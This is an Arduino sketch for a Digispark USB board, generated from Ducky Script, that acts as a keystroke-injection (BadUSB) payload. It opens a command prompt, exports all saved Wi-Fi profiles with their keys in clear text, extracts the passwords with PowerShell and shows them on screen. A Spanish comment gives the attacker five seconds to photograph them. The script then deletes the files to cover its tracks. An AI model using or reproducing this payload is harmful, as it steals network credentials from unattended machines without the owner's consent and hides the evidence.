//[ ===== Created using duckify.huhn.me @ dev 356a9805 ===== ] //
// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
// Please consider supporting us on ko-fi.com/spacehuhn <3
// Learn more about us at spacehuhn.com

// Platform: Digispark
// Keyboard Layout: ES-LA

#include "DigiKeyboard.h"

// cmd
const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7};
// cd %temp%
const uint8_t key_arr_1[] PROGMEM = {0,6, 0,7, 0,44, 2,34, 0,23, 0,8, 0,16, 0,19, 2,34};
// netsh wlan export profile key=clear
const uint8_t key_arr_2[] PROGMEM = {0,17, 0,8, 0,23, 0,22, 0,11, 0,44, 0,26, 0,15, 0,4, 0,17, 0,44, 0,8, 0,27, 0,19, 0,18, 0,21, 0,23, 0,44, 0,19, 0,21, 0,18, 0,9, 0,12, 0,15, 0,8, 0,44, 0,14, 0,8, 0,28, 2,39, 0,6, 0,15, 0,8, 0,4, 0,21};
// powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
const uint8_t key_arr_3[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,56, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 0,56, 2,19, 0,4, 0,23, 0,11, 0,44, 2,26, 0,12, 2,48, 0,55, 0,27, 0,16, 0,15, 0,44, 0,56, 2,19, 0,4, 0,23, 0,23, 0,8, 0,21, 0,17, 0,44, 0,45, 0,14, 0,8, 0,28, 2,16, 0,4, 0,23, 0,8, 0,21, 0,12, 0,4, 0,15, 0,45, 0,44, 2,100, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 0,56, 2,19, 2,4, 2,22, 2,22};
// copy Wi-Fi-PASS PSS.txt
const uint8_t key_arr_4[] PROGMEM = {0,6, 0,18, 0,19, 0,28, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 0,56, 2,19, 2,4, 2,22, 2,22, 0,44, 2,19, 2,22, 2,22, 0,55, 0,23, 0,27, 0,23};
// del Wi-* /s /f /q
const uint8_t key_arr_5[] PROGMEM = {0,7, 0,8, 0,15, 0,44, 2,26, 0,12, 0,56, 2,48, 0,44, 2,36, 0,22, 0,44, 2,36, 0,9, 0,44, 2,36, 0,20};
// PSS.txt
const uint8_t key_arr_6[] PROGMEM = {2,19, 2,22, 2,22, 0,55, 0,23, 0,27, 0,23};
// del pss.txt
const uint8_t key_arr_7[] PROGMEM = {0,7, 0,8, 0,15, 0,44, 0,19, 0,22, 0,22, 0,55, 0,23, 0,27, 0,23};
// exit
const uint8_t key_arr_8[] PROGMEM = {0,8, 0,27, 0,12, 0,23};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(21, 8); // GUI R
    DigiKeyboard.delay(500);
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING cmd
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING cd %temp%
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING netsh wlan export profile key=clear
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    DigiKeyboard.delay(5000); // DELAY 5000
    DigiKeyboard.delay(500);
    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING copy Wi-Fi-PASS PSS.txt
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    duckyString(key_arr_5, sizeof(key_arr_5)); // STRING del Wi-* /s /f /q
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    duckyString(key_arr_6, sizeof(key_arr_6)); // STRING PSS.txt
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(82, 8); // GUI UP
    DigiKeyboard.delay(500);
    DigiKeyboard.delay(5000); // DELAY 5000   - Aquí tienes 5 segundos para tomar la foto antes que se borre
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(61, 4); // ALT F4
    DigiKeyboard.delay(500);
    duckyString(key_arr_7, sizeof(key_arr_7)); // STRING del pss.txt
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    duckyString(key_arr_8, sizeof(key_arr_8)); // STRING exit
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
}

void loop() {}

// Created using duckify.huhn.me @ dev 356a9805
